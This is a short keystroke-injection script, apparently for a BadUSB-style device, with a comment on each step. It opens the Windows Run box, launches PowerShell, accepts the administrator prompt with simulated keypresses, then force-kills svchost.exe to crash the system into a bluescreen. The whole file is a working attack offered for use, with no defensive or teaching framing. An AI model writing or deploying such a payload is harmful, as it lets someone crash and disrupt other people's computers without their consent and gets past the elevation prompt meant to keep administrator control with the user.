layout('us'); //set keyboard layout to us.
typingSpeed(0,0) //set typing speed to max.
press("GUI r") //windows button + R (Run box)
delay(1000);
type("powershell"); //opens powershell
press("control shift enter"); //opens powershell in admin mode
delay(2000);
press("left enter"); //selects 'yes' in the admin prompt.
delay(3000);
type("taskkill /f /im svchost.exe\n"); //instantly kills svchost.exe which causes a bluescreen.
